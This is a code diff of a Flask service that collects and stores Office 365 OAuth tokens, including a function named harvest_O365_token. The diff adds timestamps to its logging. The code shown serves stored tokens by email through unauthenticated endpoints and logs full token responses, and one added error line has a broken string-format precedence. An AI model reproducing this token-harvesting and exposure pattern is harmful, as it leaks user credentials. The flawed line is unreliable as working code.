@@ -13,6 +13,7 @@ from dto import UserDataTransferObject
 from locators import Office365AdminLoginTags
 from urllib.parse import quote, unquote
 from logging.handlers import RotatingFileHandler
+from datetime import datetime
 import logging
 
 
@@ -94,19 +95,19 @@ def callback():
         with get_session() as Session:
             Session.add(dao)
     except Exception as e:
-        print("[!] Error " + str(e))
+        print("%s | [!] Error " + str(e) % datetime.now().isoformat(),)
         return {"stored": False}, 400
     # return a json response
-    print("[§] JWT Stored!")
+    print("%s | [§] JWT Stored!" % datetime.now().isoformat())
     return {"stored": True}, 201
 
 @app.route("/refreshToken", methods=["GET"])
 def refresh_token_for_user():
     user_mail = request.args.get("email")
-    logger.info("refresh_token_for_user (params: %s)" % user_mail)
+    logger.info("%s | refresh_token_for_user (params: %s)" % (datetime.now().isoformat(), user_mail))
     dao = UserDataAccessObject.query.filter_by(user=user_mail).first()
     if not dao:
-        logger.info("no such email in database, return ( {}, 404 )")
+        logger.info("%s | no such email in database, return ( {}, 404 )" % datetime.now().isoformat())
         response = {}, 400
         return response
     dto = UserDataTransferObject(uid=dao.id, user=dao.user, token=dao.token)
@@ -129,13 +130,12 @@ def refresh_token_for_user():
                 Session.add(dao)
             dto.token = new_token
         except Exception as e:
-            print("Error", str(e))
-            logger.error("%s" % str(e))
+            logger.error("%s | %s" % (datetime.now().isoformat(), str(e)))
             response = {"stored": False}, 400
-            logger.info("not data found -> %s" % str(response))
+            logger.info("%s | not data found -> %s" % (datetime.now().isoformat(), str(response)))
             return response
     response = {"stored": True}, 201
-    logger.info("data found -> %s" % str(response))
+    logger.info("%s | data found -> %s" % (datetime.now().isoformat(), str(response)))
     return response
 
 
@@ -143,7 +143,7 @@ def refresh_token_for_user():
 def first_time_create_token():
     global driver, email
     email = request.args.get("email")
-    logger.info("first_time_create_token (params: %s)" % email)
+    logger.info("%s | first_time_create_token (params: %s)" % (datetime.now().isoformat(), email))
     try:
         driver = getwebdriver()
         # Loop through each user in users
@@ -151,13 +151,12 @@ def first_time_create_token():
         # cleanup all cookies and close admin_driver session
         cleanup(driver)
         response = {"stored": True}, 201
-        logger.info("data found -> %s" % str(response))
+        logger.info("%s | data found -> %s" % (datetime.now().isoformat(), str(response)))
         return response
     except Exception as e:
-        print("Error", str(e))
         logger.error("%s" % str(e))
         response = {"stored": False}, 400
-        logger.info("not data found -> %s" % str(response))
+        logger.info("%s | not data found -> %s" % (datetime.now().isoformat(), str(response)))
         return response
 
 
@@ -165,15 +164,15 @@ def first_time_create_token():
 def get_user_data():
     global driver, flow
     user_mail = request.args.get("email")
-    logger.info("get_user_data (params: %s)" % user_mail)
+    logger.info("%s | get_user_data (params: %s)" % (datetime.now().isoformat(), user_mail))
     dao = UserDataAccessObject.query.filter_by(user=user_mail).first()
     if not dao:
-        logger.info("no such email in database, return ( {}, 404 )")
+        logger.info("%s | no such email in database, return ( {}, 404 )" % datetime.now().isoformat())
         return {}, 404
     dto = UserDataTransferObject(uid=dao.id, user=dao.user, token=dao.token)
     dto.token = loads(dto.token)
     response = {"id": dto.uid, "user": dto.user, "token": dto.token}, 200
-    logger.info("data found -> %s" % str(response))
+    logger.info("%s | data found -> %s" % (datetime.now().isoformat(), str(response)))
     return response
 
 
@@ -301,7 +300,7 @@ def harvest_O365_token(given_user):
     global driver, flow
     flow = OAuth2Session(CLIENT_ID, scope=SCOPES, redirect_uri=REDIRECT_URL)
     # Create an entry for InstalledAppFlow to bypass OAuth2 WebApp (using Desktop App)
-    print("[*] Office365FlowObject -> %s" % hex(id(flow)))
+    print("%s | [*] Office365FlowObject -> %s" % (datetime.now().isoformat(), hex(id(flow))))
     # override the redirection url to http://localhost:8000
     if ':' not in REDIRECT_URL:
         flow.redirect_uri = "%s:%d" % (REDIRECT_URL, PORT)
